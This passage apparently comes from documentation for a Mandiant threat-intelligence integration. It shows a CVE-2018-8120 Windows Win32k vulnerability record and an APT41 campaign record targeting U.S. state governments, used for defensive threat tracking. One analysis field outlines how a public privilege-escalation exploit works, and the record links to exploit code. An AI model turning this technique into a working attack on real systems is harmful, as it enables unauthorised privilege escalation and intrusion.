                            "scope": "UNCHANGED",
                            "temporal_score": 6.5,
                            "user_interaction": "NONE",
                            "vector_string": "CVSS:3.0/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"
                        }
                    },
                    "cpe_ranges": [],
                    "cve_id": "CVE-2018-8120",
                    "cwe": "Null Pointer Dereference",
                    "cwe_details": null,
                    "date_of_disclosure": "2018-05-04T06:00:00.000Z",
                    "days_to_patch": null,
                    "description": "<p><a href=\"https://www.microsoft.com/en-sg/windows\">Windows </a>is the flagship operating system by Microsoft.</p>\n<p>&nbsp;</p>\n<p>A vulnerability exists in the NtUserSetImeInfoEx() function within the win32k kernel component in Microsoft Windows Server. The issue occurs because the SetImeInfoEx subroutine, within the NtUserSetImeInfoEx() function, does not validate a data pointer, this results in issue where an application dereferences a pointer which is Null.</p>",
                    "epss": null,
                    "executive_summary": "<p>A null pointer dereference vulnerability exists in the NtUserSetImeInfoEx() function within the Win32k component in Microsoft Windows Server 2008 and earlier that, when exploited, allows an attacker to locally gain elevated privileges. Exploit code is publicly available and Microsoft reported that this vulnerability has been exploited in the wild. Mitigation options include a vendor fix. Exploitation Rating: Confirmed</p>",
                    "exploitation_consequence": "Code Execution",
                    "exploitation_state": "Confirmed",
                    "exploitation_vectors": [
                        "Local Access"
                    ],
                    "exploits": [
                        {
                            "description": "This exploit is a Metasploit module that can trigger the null pointer dereference issue on an affected server and yield an attacker elevated privileges on the affected system.",
                            "exploit_url": "https://www.exploit-db.com/exploits/45653/",
                            "file_size": 4498,
                            "grade": "",
                            "hashes": {},
                            "md5": "5dd08479823a39d8d808ead98110a070",
                            "name": "ms18_8120_win32k_privesc.rb",
                            "release_date": "2018-10-20T06:00:00Z",
                            "reliability": "Untested",
                            "replication_urls": []
                        },
                        {
                            "description": "This exploit will trigger this vulnerability to gain elevated privileges.",
                            "exploit_url": "https://github.com/leeqwind/HolicPOC/blob/master/windows/win32k/CVE-2018-8120/x86.cpp",
                            "file_size": 13367,
                            "grade": "",
                            "hashes": {},
                            "md5": "1A0D48A31B50691F8613B31A53C4D16A",
                            "name": "CVE-2018-8120_exploit",
                            "release_date": "2018-05-14T06:00:00Z",
                            "reliability": "Untested",
                            "replication_urls": []
                        }
                    ],
                    "id": "vulnerability--6dc0a4db-e822-5c76-bca2-b7eb750da2ad",
                    "intel_free": false,
                    "is_publishable": true,
                    "last_modified_date": "2022-12-09T02:36:33.290Z",
                    "observed_in_the_wild": true,
                    "publish_date": "2022-04-05T14:17:00.000Z",
                    "risk_rating": "MEDIUM",
                    "sources": [
                        {
                            "date": "2018-05-08T17:00:00.000Z",
                            "is_vendor_fix": false,
                            "source_description": "CVE-2018-8120",
                            "source_name": "Microsoft Corp.",
                            "url": "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8120"
                        },
                        {
                            "date": "2018-05-15T16:00:00.000Z",
                            "is_vendor_fix": false,
                            "source_description": "A tale of two zero-days",
                            "source_name": "WeLiveSecurity",
                            "url": "https://www.welivesecurity.com/2018/05/15/tale-two-zero-days/"
                        },
                        {
                            "date": "2019-05-13T16:00:00.000Z",
                            "is_vendor_fix": false,
                            "source_name": "Kaspersky Lab",
                            "url": "https://securelist.com/scarcruft-continues-to-evolve-introduces-bluetooth-harvester/90729/"
                        },
                        {
                            "date": "2019-11-05T05:00:00.000Z",
                            "is_vendor_fix": false,
                            "source_description": "New Exploit Kit Capesand Reuses Old and New Public Exploits and Tools, Blockchain Ruse",
                            "source_name": "Trend Micro",
                            "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/new-exploit-kit-capesand-reuses-old-and-new-public-exploits-and-tools-blockchain-ruse/"
                        },
                        {
                            "date": "2022-03-15T12:00:00.000Z",
                            "is_vendor_fix": false,
                            "source_description": "CISA Known Exploited Vulnerabilities Catalog",
                            "source_name": "CISA",
                            "url": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
                        },
                        {
                            "date": "2022-03-24T04:00:00.000Z",
                            "is_vendor_fix": false,
                            "source_name": "Tenable Inc.",
                            "url": "https://www.tenable.com/blog/contileaks-chats-reveal-over-30-vulnerabilities-used-by-conti-ransomware-affiliates"
                        }
                    ],
                    "title": "Microsoft Windows Server 2008 NtUserSetImeInfoEx() Null Pointer Dereference Vulnerability",
                    "type": "vulnerability",
                    "updated_date": "2022-04-05T14:17:00.000Z",
                    "vendor_fix_references": [
                        {
                            "name": "Microsoft Security Update Information",
                            "unique_id": "",
                            "url": "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8120"
                        }
                    ],
                    "version_history": [],
                    "vulnerable_cpes": [
                        {
                            "cpe": "cpe:2.3:o:microsoft:windows_server_2008:r2:sp1:itanium:*:*:*:*:*",
                            "cpe_title": "microsoft windows_server_2008 r2",
                            "technology_name": "windows_server_2008 r2",
                            "vendor_name": "microsoft"
                        },
                        {
                            "cpe": "cpe:2.3:o:microsoft:windows_server_2008:sp2:*:x64:*:*:*:*:*",
                            "cpe_title": "microsoft windows_server_2008 sp2",
                            "technology_name": "windows_server_2008 sp2",
                            "vendor_name": "microsoft"
                        },
                        {
                            "cpe": "cpe:2.3:o:microsoft:windows_server_2008:r2:sp1:x64:*:*:*:*:*",
                            "cpe_title": "microsoft windows_server_2008 r2",
                            "technology_name": "windows_server_2008 r2",
                            "vendor_name": "microsoft"
                        },
                        {
                            "cpe": "cpe:2.3:o:microsoft:windows_7:-:sp1:x64:*:*:*:*:*",
                            "cpe_title": "microsoft windows_7 -",
                            "technology_name": "windows_7 -",
                            "vendor_name": "microsoft"
                        },
                        {
                            "cpe": "cpe:2.3:o:microsoft:windows_server_2008:-:sp2:itanium:*:*:*:*:*",
                            "cpe_title": "microsoft windows_server_2008 -",
                            "technology_name": "windows_server_2008 -",
                            "vendor_name": "microsoft"
                        },
                        {
                            "cpe": "cpe:2.3:o:microsoft:windows_server_2008:-:sp2:*:*:*:*:*:*",
                            "cpe_title": "microsoft windows_server_2008 -",
                            "technology_name": "windows_server_2008 -",
                            "vendor_name": "microsoft"
                        },
                        {
                            "cpe": "cpe:2.3:o:microsoft:windows_7:-:sp1:x86:*:*:*:*:*",
                            "cpe_title": "microsoft windows_7 -",
                            "technology_name": "windows_7 -",
                            "vendor_name": "microsoft"
                        }
                    ],
                    "vulnerable_products": "<p>Microsoft reports that the following products and versions are vulnerable:</p>\n<ul>\n<li>Windows 7 for 32-bit Systems Service Pack 1</li>\n<li>Windows 7 for x64-based Systems Service Pack 1</li>\n<li>Windows Server 2008 for 32-bit Systems Service Pack2</li>\n<li>Windows Server 2008 for Itanium-based Systems Service Pack2</li>\n<li>Windows Server 2008 for x64-based Systems Service Pack2</li>\n<li>Windows Server 2008 for R2 for Itanium-based Systems Service Pack 1</li>\n<li>Windows Server 2008 for x64-based Systems Service Pack 1</li>\n</ul>",
                    "was_zero_day": true,
                    "workarounds": "<p>Aside from the available vendor fix, FireEye iSIGHT Intelligence is unaware of any alternate mitigation procedures for this vulnerability.</p>",
                    "workarounds_list": []
                },
                "relationships": [],
                "score": 0,
                "type": "CVE",
                "value": null
            }
        ]
    }
}
```

#### Human Readable Output

>### Results
>|fields|rawJSON|relationships|score|type|value|
>|---|---|---|---|---|---|
>| stixid: vulnerability--6dc0a4db-e822-5c76-bca2-b7eb750da2ad<br/>trafficlightprotocol: AMBER<br/>DBotScore: {"Indicator": null, "Type": "cve", "Vendor": "Mandiant", "Score": 0, "Reliability": "A - Completely reliable"}<br/>id: null<br/>cvss: v2.0<br/>cvssvector: AV:L/AC:M/Au:N/C:C/I:C/A:C/E:F/RL:OF/RC:C<br/>cvss2: {'metric': 'Access Complexity', 'values': 'MEDIUM'},<br/>{'metric': 'Access Vector', 'values': 'LOCAL'},<br/>{'metric': 'Authentication', 'values': 'NONE'},<br/>{'metric': 'Availability Impact', 'values': 'COMPLETE'},<br/>{'metric': 'Base Score', 'values': 6.9},<br/>{'metric': 'Confidentiality Impact', 'values': 'COMPLETE'},<br/>{'metric': 'Exploitability', 'values': 'FUNCTIONAL'},<br/>{'metric': 'Integrity Impact', 'values': 'COMPLETE'},<br/>{'metric': 'Remediation Level', 'values': 'OFFICIAL_FIX'},<br/>{'metric': 'Report Confidence', 'values': 'CONFIRMED'},<br/>{'metric': 'Temporal Score', 'values': 5.7},<br/>{'metric': 'Vector String', 'values': 'AV:L/AC:M/Au:N/C:C/I:C/A:C/E:F/RL:OF/RC:C'} | id: vulnerability--6dc0a4db-e822-5c76-bca2-b7eb750da2ad<br/>type: vulnerability<br/>is_publishable: true<br/>risk_rating: MEDIUM<br/>analysis: <p>An attacker could exploit this vulnerability to execute arbitrary code. An attacker would need to gain low privilege access to the vulnerable system to exploit this issue. Further, upon obtaining the low privilege access, an attacker would need to craft a program which can change the privilege of the current process, using the call gate functions. A failed attempt at exploitation could potentially cause a crash of the application, resulting in a denial-of-service condition.</p><br/><p>&nbsp;</p><br/><p>A non-weaponized exploit is publicly available on VirusTotal, in the form of a PDF sample. This exploit code creates a new windowstation object and assigns it to the current process in user-mode, making the spklList Pointer field equal to zero. This code writes an arbitrary address in the kernel space by mapping the NULL page and setting a pointer to offset 0x2C. Upon writing an arbitrary address, the attacker changes the privilege level of a process by setting call gate to Ring 0. Further, the exploit uses the CALL FAR instruction to perform an inter-privilege level call, giving an attacker administrative access on the system. A similar exploit code is also publicly available via GitHub.</p><br/><p>&nbsp;</p><br/><p>An exploit code in the form of a Metasploit module has been publicly released. This exploit can trigger the null pointer dereference issue which is caused when the Win32k component does not properly handle objects in memory. Successful exploitation via this code will allow an attacker to perform privileged tasks on the compromised machine.</p><br/><p>&nbsp;</p><br/><p>Microsoft has reported this vulnerability has been exploited. Additionally, it is reported that threat actor ScarCruft is utilizing the publicly available exploit code to drop a backdoor, known as ROKRAT, used for data exfiltration. FireEye tracks most elements of the group publicly reported as Scarcruft as APT37 (Reaper).</p><br/><p>&nbsp;</p><br/><p>Trend Micro has reported observation of a malverstising campaign at the end of October 2019 using an exploit kit they refer to as Capesand to deliver DarkRAT and njRAT malware. This vulnerability was reportedly leveraged after successful exploitation via Capesand in order to gain escalated privileges and execute njcrypt.exe.</p><br/><p>&nbsp;</p><br/><p>No workaround is available, although the Microsoft reportedly addressed this vulnerability in a fix. FireEye iSIGHT Intelligence considers this a Medium-risk vulnerability because of possibility of arbitrary code execution offset by the local access required.</p><br/><p><br />CISA added this vulnerability to its Known Exploited Vulnerabilities Catalog on March 15, 2022, with a required remediation date of April 5, 2022.</p><br/>executive_summary: <p>A null pointer dereference vulnerability exists in the NtUserSetImeInfoEx() function within the Win32k component in Microsoft Windows Server 2008 and earlier that, when exploited, allows an attacker to locally gain elevated privileges. Exploit code is publicly available and Microsoft reported that this vulnerability has been exploited in the wild. Mitigation options include a vendor fix. Exploitation Rating: Confirmed</p><br/>description: <p><a href="https://www.microsoft.com/en-sg/windows">Windows </a>is the flagship operating system by Microsoft.</p><br/><p>&nbsp;</p><br/><p>A vulnerability exists in the NtUserSetImeInfoEx() function within the win32k kernel component in Microsoft Windows Server. The issue occurs because the SetImeInfoEx subroutine, within the NtUserSetImeInfoEx() function, does not validate a data pointer, this results in issue where an application dereferences a pointer which is Null.</p><br/>exploitation_vectors: Local Access<br/>title: Microsoft Windows Server 2008 NtUserSetImeInfoEx() Null Pointer Dereference Vulnerability<br/>associated_actors: {'last_updated': '2023-03-04T07:03:58Z', 'aliases': [{'name': 'Odinaff (Symantec)', 'attribution_scope': 'confirmed'}, {'name': 'Sectoj04 (NSHC Group)', 'attribution_scope': 'confirmed'}, {'name': 'TA505 (Proofpoint)', 'attribution_scope': 'confirmed'}, {'name': 'TEMP.Warlock', 'attribution_scope': 'confirmed'}, {'name': 'Ta505 (Norfolkinfosec)', 'attribution_scope': 'confirmed'}, {'name': 'Ta505 (Trend Micro)', 'attribution_scope': 'confirmed'}], 'name': 'FIN11', 'description': "FIN11 is a financially motivated threat group that has conducted some of the largest and longest running malware distribution campaigns observed amongst our FIN groups to date. Mandiant has observed FIN11 attempt to monetize their operations at least once using named point-of-sale (POS) malware, and more recently using CLOP ransomware and/or data theft extortion. The volume of FIN11's high-volume spam campaigns slowed in 2021, before ceasing altogether in 2022, when the group shifted to server exploitation for initial access. The group has been active since at least 2016, but identified overlaps with activity tracked by security researchers as TA505 suggest they may have been conducting operations as early as 2014.", 'id': 'threat-actor--b8ee8129-5ecc-581a-a636-fb17051d2ffe', 'intel_free': False, 'country_code': 'unknown'}<br/>associated_malware: {'last_updated': '2023-03-06T02:10:40.000Z', 'aliases': [], 'name': 'BADPOTATO', 'description': 'BADPOTATO is a publicly available privilege escalation tool that abuses Impersonation Privileges on Windows 10 and Windows Server 2019. ', 'id': 'malware--8e99e597-dda4-57dc-be6e-f1bc8b80a5f3', 'intel_free': False, 'has_yara': True, 'is_malicious': True},<br/>{'last_updated': '2023-03-06T02:13:12.000Z', 'aliases': [], 'name': 'COMAHAWK', 'description': 'COMAHAWK is a privilege escalation tool that attempts to exploit CVE-2019-1405 and CVE-2019-1322.', 'id': 'malware--0073c12d-177a-5353-8170-e72ac8fc75bb', 'intel_free': False, 'has_yara': True, 'is_malicious': True}<br/>associated_reports: {'report_id': '18-00007543', 'report_type': 'Patch Report', 'title': 'Microsoft May 2018 Security Advisory Release', 'published_date': '2018-05-08T23:36:07.596Z', 'audience': ['vulnerability']},<br/>{'report_id': '19-00009557', 'report_type': 'Trends and Forecasting', 'title': 'May 2019 Month in Vulnerabilities', 'published_date': '2019-06-12T13:15:13.875Z', 'audience': ['vulnerability']},<br/>{'report_id': '19-00021769', 'report_type': 'Trends and Forecasting', 'title': 'Analysis of Time to Exploit in Tracked Vulnerabilities Exploited in 2018–2019', 'published_date': '2019-12-18T13:16:56.301Z', 'audience': ['strategic', 'vulnerability']},<br/>{'report_id': '18-00017419', 'report_type': 'Trends and Forecasting', 'title': 'Operational Net Assessment of Cyber Crime ThreatsâJuly to September 2018', 'published_date': '2018-10-19T20:32:50.054Z', 'audience': ['cyber crime', 'fusion']},<br/>{'report_id': '18-00009795', 'report_type': 'Vulnerability Report', 'title': 'May 2018 Month in Vulnerabilities', 'published_date': '2018-06-18T23:04:39.328Z', 'audience': ['vulnerability']},<br/>{'report_id': '18-00010584', 'report_type': 'Threat Activity Alert', 'title': 'Threat Activity Alert: Russian-Speaking Actor Advertises a Malicious PDF Builder with CVE-2018-4990 and CVE-2018-8120 Exploits', 'published_date': '2018-06-28T18:46:09.706Z', 'audience': ['cyber crime', 'fusion', 'vulnerability']},<br/>{'report_id': '19-00002007', 'report_type': 'Actor Profile', 'title': 'Threat Actor Profile: GandCrab ', 'published_date': '2019-02-05T22:02:15.475Z', 'audience': ['cyber crime', 'fusion']},<br/>{'report_id': '18-00017293', 'report_type': 'Trends and Forecasting', 'title': 'Monthly Report on Cyber Crime Threats to the Financial Sector – September 2018', 'published_date': '2018-10-16T18:37:46.427Z', 'audience': ['cyber crime', 'fusion']},<br/>{'report_id': '18-00007690', 'report_type': 'Vulnerability Report', 'title': 'Microsoft Windows Server 2008 NtUserSetImeInfoEx() Null Pointer Dereference Vulnerability', 'published_date': '2022-04-05T14:17:42.242Z', 'audience': ['vulnerability']},<br/>{'report_id': '18-00003542', 'report_type': 'Malware Profile', 'title': 'GandCrab Ransomware Malware Profile', 'published_date': '2019-12-16T19:20:00.473Z', 'audience': ['cyber crime', 'operational']}<br/>exploitation_consequence: Code Execution<br/>cwe: Null Pointer Dereference<br/>cve_id: CVE-2018-8120<br/>vulnerable_products: <p>Microsoft reports that the following products and versions are vulnerable:</p><br/><ul><br/><li>Windows 7 for 32-bit Systems Service Pack 1</li><br/><li>Windows 7 for x64-based Systems Service Pack 1</li><br/><li>Windows Server 2008 for 32-bit Systems Service Pack2</li><br/><li>Windows Server 2008 for Itanium-based Systems Service Pack2</li><br/><li>Windows Server 2008 for x64-based Systems Service Pack2</li><br/><li>Windows Server 2008 for R2 for Itanium-based Systems Service Pack 1</li><br/><li>Windows Server 2008 for x64-based Systems Service Pack 1</li><br/></ul><br/>exploitation_state: Confirmed<br/>vendor_fix_references: {'url': 'https:<span>//</span>portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8120', 'name': 'Microsoft Security Update Information', 'unique_id': ''}<br/>date_of_disclosure: 2018-05-04T06:00:00.000Z<br/>observed_in_the_wild: true<br/>vulnerable_cpes: {'vendor_name': 'microsoft', 'technology_name': 'windows_server_2008 r2', 'cpe': 'cpe:2.3:o:microsoft:windows_server_2008:r2:sp1:itanium:*:*:*:*:*', 'cpe_title': 'microsoft windows_server_2008 r2'},<br/>{'vendor_name': 'microsoft', 'technology_name': 'windows_server_2008 sp2', 'cpe': 'cpe:2.3:o:microsoft:windows_server_2008:sp2:*:x64:*:*:*:*:*', 'cpe_title': 'microsoft windows_server_2008 sp2'},<br/>{'vendor_name': 'microsoft', 'technology_name': 'windows_server_2008 r2', 'cpe': 'cpe:2.3:o:microsoft:windows_server_2008:r2:sp1:x64:*:*:*:*:*', 'cpe_title': 'microsoft windows_server_2008 r2'},<br/>{'vendor_name': 'microsoft', 'technology_name': 'windows_7 -', 'cpe': 'cpe:2.3:o:microsoft:windows_7:-:sp1:x64:*:*:*:*:*', 'cpe_title': 'microsoft windows_7 -'},<br/>{'vendor_name': 'microsoft', 'technology_name': 'windows_server_2008 -', 'cpe': 'cpe:2.3:o:microsoft:windows_server_2008:-:sp2:itanium:*:*:*:*:*', 'cpe_title': 'microsoft windows_server_2008 -'},<br/>{'vendor_name': 'microsoft', 'technology_name': 'windows_server_2008 -', 'cpe': 'cpe:2.3:o:microsoft:windows_server_2008:-:sp2:*:*:*:*:*:*', 'cpe_title': 'microsoft windows_server_2008 -'},<br/>{'vendor_name': 'microsoft', 'technology_name': 'windows_7 -', 'cpe': 'cpe:2.3:o:microsoft:windows_7:-:sp1:x86:*:*:*:*:*', 'cpe_title': 'microsoft windows_7 -'}<br/>was_zero_day: true<br/>workarounds: <p>Aside from the available vendor fix, FireEye iSIGHT Intelligence is unaware of any alternate mitigation procedures for this vulnerability.</p><br/>publish_date: 2022-04-05T14:17:00.000Z<br/>updated_date: 2022-04-05T14:17:00.000Z<br/>last_modified_date: 2022-12-09T02:36:33.290Z<br/>available_mitigation: Patch<br/>sources: {'source_name': 'Microsoft Corp.', 'source_description': 'CVE-2018-8120', 'date': '2018-05-08T17:00:00.000Z', 'url': 'https:<span>//</span>portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8120', 'is_vendor_fix': False},<br/>{'source_name': 'WeLiveSecurity', 'source_description': 'A tale of two zero-days', 'date': '2018-05-15T16:00:00.000Z', 'url': 'https:<span>//</span>www.welivesecurity.com/2018/05/15/tale-two-zero-days/', 'is_vendor_fix': False},<br/>{'source_name': 'Kaspersky Lab', 'date': '2019-05-13T16:00:00.000Z', 'url': 'https:<span>//</span>securelist.com/scarcruft-continues-to-evolve-introduces-bluetooth-harvester/90729/', 'is_vendor_fix': False},<br/>{'source_name': 'Trend Micro', 'source_description': 'New Exploit Kit Capesand Reuses Old and New Public Exploits and Tools, Blockchain Ruse', 'date': '2019-11-05T05:00:00.000Z', 'url': 'https:<span>//</span>blog.trendmicro.com/trendlabs-security-intelligence/new-exploit-kit-capesand-reuses-old-and-new-public-exploits-and-tools-blockchain-ruse/', 'is_vendor_fix': False},<br/>{'source_name': 'CISA', 'source_description': 'CISA Known Exploited Vulnerabilities Catalog', 'date': '2022-03-15T12:00:00.000Z', 'url': 'https:<span>//</span>www.cisa.gov/known-exploited-vulnerabilities-catalog', 'is_vendor_fix': False},<br/>{'source_name': 'Tenable Inc.', 'date': '2022-03-24T04:00:00.000Z', 'url': 'https:<span>//</span>www.tenable.com/blog/contileaks-chats-reveal-over-30-vulnerabilities-used-by-conti-ransomware-affiliates', 'is_vendor_fix': False}<br/>exploits: {'name': 'ms18_8120_win32k_privesc.rb', 'description': 'This exploit is a Metasploit module that can trigger the null pointer dereference issue on an affected server and yield an attacker elevated privileges on the affected system.', 'reliability': 'Untested', 'file_size': 4498, 'md5': '5dd08479823a39d8d808ead98110a070', 'release_date': '2018-10-20T06:00:00Z', 'exploit_url': 'https:<span>//</span>www.exploit-db.com/exploits/45653/', 'replication_urls': [], 'grade': '', 'hashes': {}},<br/>{'name': 'CVE-2018-8120_exploit', 'description': 'This exploit will trigger this vulnerability to gain elevated privileges.', 'reliability': 'Untested', 'file_size': 13367, 'md5': '1A0D48A31B50691F8613B31A53C4D16A', 'release_date': '2018-05-14T06:00:00Z', 'exploit_url': 'https:<span>//</span>github.com/leeqwind/HolicPOC/blob/master/windows/win32k/CVE-2018-8120/x86.cpp', 'replication_urls': [], 'grade': '', 'hashes': {}}<br/>common_vulnerability_scores: {"v2.0": {"access_complexity": "MEDIUM", "access_vector": "LOCAL", "authentication": "NONE", "availability_impact": "COMPLETE", "base_score": 6.9, "confidentiality_impact": "COMPLETE", "exploitability": "FUNCTIONAL", "integrity_impact": "COMPLETE", "remediation_level": "OFFICIAL_FIX", "report_confidence": "CONFIRMED", "temporal_score": 5.7, "vector_string": "AV:L/AC:M/Au:N/C:C/I:C/A:C/E:F/RL:OF/RC:C"}, "v3.0": {"attack_complexity": "HIGH", "attack_vector": "LOCAL", "availability_impact": "HIGH", "base_score": 7, "confidentiality_impact": "HIGH", "exploit_code_maturity": "FUNCTIONAL", "integrity_impact": "HIGH", "privileges_required": "LOW", "remediation_level": "OFFICIAL_FIX", "report_confidence": "CONFIRMED", "scope": "UNCHANGED", "temporal_score": 6.5, "user_interaction": "NONE", "vector_string": "CVSS:3.0/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"}}<br/>audience: intel_vuln<br/>intel_free: false<br/>affects_ot: false<br/>aliases: <br/>cisa_known_exploited: null<br/>cpe_ranges: <br/>cwe_details: null<br/>days_to_patch: null<br/>epss: null<br/>version_history: <br/>workarounds_list:  |  | 0 | CVE |  |


### mati-get-campaign

***
Retrieve information about a Campaign from Mandiant

#### Base Command

`mati-get-campaign`

#### Input

| **Argument Name** | **Description** | **Required** |
| --- | --- | --- |
| campaign_id | ID of the campaign to lookup. | Required | 

#### Context Output

| **Path** | **Type** | **Description** |
| --- | --- | --- |
| MANDIANTTI.Campaign.value | String | The name of the Campaign | 
| MANDIANTTI.Campaign.fields.actors | String | The Threat Actors associated with the Campaign | 
| MANDIANTTI.Campaign.fields.description | String | The description of the Campaign | 
| MANDIANTTI.Campaign.fields.tags | String | The industries associated with the Campaign | 
| MANDIANTTI.Campaign.fields.publications.title | String | The title of a report associated with the Campaign | 
| MANDIANTTI.Campaign.fields.publications.link | String | The link to the report in Mandiant Advantage | 

#### Command example
```!mati-get-campaign campaign_id=CAMP.21.014```
#### Context Example
```json
{
    "MANDIANTTI": {
        "Campaign": {
            "fields": {
                "DBot Score": {
                    "Indicator": null,
                    "Reliability": "A - Completely reliable",
                    "Score": 0,
                    "Type": "Campaign",
                    "Vendor": "Mandiant"
                },
                "actors": [
                    "APT41"
                ],
                "description": "In mid-October 2021, Mandiant observed a wave of APT41 activity targeting multiple U.S. state governments. We believe the actors exploited a vulnerability in a public-facing web application, used by numerous state governments and U.S. educational research institutes, to gain initial access. The actors then conducted reconnaissance and credential harvesting activity, dropping multiple files including the publicly available BADPOTATO privilege escalation tool. Mandiant also identified the DEADEYE dropper, which executed a KEYPLUG backdoor.  \n\nThis activity is likely a continuation of a previously observed APT41 campaign targeting multiple U.S. state government entities in May 2021. The specific motivation behind the targeting of U.S. state government entities remains unclear, though we infer, based on the targeting profile, that the purpose may include capturing political intelligence or data related to sensitive technologies with national or state-level applications. It is also possible that the capture of credentials can facilitate future targeting or pivoting to targets of interest.",
                "publications": [],
                "tags": [
                    "Governments"
                ]
            },
            "rawJSON": {
                "actors": [
                    {
                        "attribution_scope": "confirmed",
                        "id": "threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64",
                        "motivations": [
                            {
                                "attribution_scope": "confirmed",
                                "id": "motivation--fa4d4992-1762-50ac-b0b1-2c75210645d0",
                                "name": "Financial Gain",
                                "releasable": true,
                                "type": "motivation"
                            },
                            {
                                "attribution_scope": "confirmed",
                                "id": "motivation--1b8ca82a-7cff-5622-bedd-965c11d38a9e",
                                "name": "Espionage",
                                "releasable": true,
                                "type": "motivation"
                            }
                        ],
                        "name": "APT41",
                        "releasable": true,
                        "source_locations": [
                            {
                                "country": {
                                    "attribution_scope": "confirmed",
                                    "id": "location--740e7e5f-f2a0-55e0-98a3-88872c55b581",
                                    "iso2": "CN",
                                    "name": "China",
                                    "releasable": true,
                                    "type": "location"
                                },
                                "region": {
                                    "attribution_scope": "confirmed",
                                    "id": "location--8fc231f3-4e62-57e7-b734-eaee0a734612",
                                    "name": "Asia",
                                    "releasable": true,
                                    "type": "location"
                                },
                                "releasable": true,
                                "sub_region": {
                                    "attribution_scope": "confirmed",
                                    "id": "location--7b33370b-da4b-5c48-9741-b69f69febb77",
                                    "name": "East Asia",
                                    "releasable": true,
                                    "type": "location"
                                }
                            }
                        ],
                        "type": "threat-actor"
                    }
                ],
                "aliases": {
                    "actor": [
                        {
                            "attribution_scope": "confirmed",
                            "id": "alias--c63f2b2b-3639-5bd0-be28-b1cb79b00b21",
                            "name": "Barium (Microsoft)",
                            "nucleus_name": "Barium",
                            "releasable": true,
                            "source": "Microsoft",
                            "type": "alias"
                        }
                    ],
                    "campaign": [],
                    "malware": [],
                    "releasable": true
                },
                "audience": [
                    {
                        "license": "INTEL_RBI_OPS",
                        "name": "intel_oper"
                    },
                    {
                        "license": "INTEL_RBI_FUS",
                        "name": "intel_fusion"
                    },
                    {
                        "license": "amber",
                        "name": "tlp_marking"
                    }
                ],
                "campaign_type": "Individual",
                "counts": {
                    "actor_collaborations": 0,
                    "actors": 1,
                    "campaigns": 0,
                    "industries": 1,
                    "malware": 19,
                    "reports": 4,
                    "timeline": 104,
                    "tools": 9,
                    "vulnerabilities": 1
                },
                "description": "In mid-October 2021, Mandiant observed a wave of APT41 activity targeting multiple U.S. state governments. We believe the actors exploited a vulnerability in a public-facing web application, used by numerous state governments and U.S. educational research institutes, to gain initial access. The actors then conducted reconnaissance and credential harvesting activity, dropping multiple files including the publicly available BADPOTATO privilege escalation tool. Mandiant also identified the DEADEYE dropper, which executed a KEYPLUG backdoor.  \n\nThis activity is likely a continuation of a previously observed APT41 campaign targeting multiple U.S. state government entities in May 2021. The specific motivation behind the targeting of U.S. state government entities remains unclear, though we infer, based on the targeting profile, that the purpose may include capturing political intelligence or data related to sensitive technologies with national or state-level applications. It is also possible that the capture of credentials can facilitate future targeting or pivoting to targets of interest.",
                "id": "campaign--c344bb9b-cb50-58be-9c33-350b622c1fce",
                "industries": [
                    {
                        "attribution_scope": "confirmed",
                        "id": "identity--8d0881d8-d199-5e5a-bef9-be3ca6bb8f0d",
                        "name": "Governments",
                        "releasable": true,
                        "type": "identity"
                    }
                ],
                "is_publishable": true,
                "last_activity_time": "2022-02-26T00:00:00.000Z",
                "malware": [
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--448e822d-8496-5021-88cb-599062f74176",
                        "name": "BEACON",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--ad51977a-c6fc-5cd3-822e-4e2aa6c832a2",
                        "name": "FASTPACE",
                        "releasable": true,
                        "type": "malware"
                    }
                ],
                "name": "APT41 Exploition of .NET Web Applications at U.S. State Governments",
                "profile_updated": "2023-03-06T07:10:13.356Z",
                "releasable": true,
                "short_name": "CAMP.21.014",
                "target_locations": {
                    "countries": [
                        {
                            "attribution_scope": "confirmed",
                            "count": 8,
                            "id": "location--5c5b39aa-9308-52a6-9daf-0547d5aaa160",
                            "iso2": "US",
                            "name": "United States of America",
                            "region": "location--6d65522f-0166-5e7e-973c-35cf7973e4e3",
                            "releasable": true,
                            "sub_region": "location--0daadcfb-ad23-5f16-b53b-6c5b09bf20de",
                            "type": "location"
                        }
                    ],
                    "regions": [
                        {
                            "attribution_scope": "confirmed",
                            "count": 8,
                            "id": "location--6d65522f-0166-5e7e-973c-35cf7973e4e3",
                            "name": "Americas",
                            "releasable": true,
                            "type": "location"
                        }
                    ],
                    "releasable": true,
                    "sub_regions": [
                        {
                            "attribution_scope": "confirmed",
                            "count": 8,
                            "id": "location--0daadcfb-ad23-5f16-b53b-6c5b09bf20de",
                            "name": "North America",
                            "region": "location--6d65522f-0166-5e7e-973c-35cf7973e4e3",
                            "releasable": true,
                            "type": "location"
                        }
                    ]
                },
                "timeline": [
                    {
                        "description": "Mandiant Declared Campaign",
                        "event_type": "created",
                        "name": "Campaign Created",
                        "releasable": true,
                        "timestamp": "2021-10-18T00:00:00.000Z"
                    },
                    {
                        "description": "Mandiant Observed First Activity of Campaign",
                        "event_type": "first_observed",
                        "name": "First Observed",
                        "releasable": true,
                        "timestamp": "2020-06-15T00:00:00.000Z"
                    }
                ],
                "tools": [
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--8130c516-308e-51e1-b16c-f398d80e67b0",
                        "name": "IMPACKET.PSEXEC",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--bf2fc1e5-7850-5ecd-87a7-263e6da5708d",
                        "name": "MIMIKATZ",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--934dcadf-f9a8-52c1-9c90-353a1c3144d5",
                        "name": "PSEXEC",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
                        "id": "malware--47530422-6b2d-5329-95c1-fcf7698edeee",
                        "name": "7ZIP",
                        "releasable": true,
                        "type": "malware"
                    },
                    {
                        "attribution_scope": "confirmed",
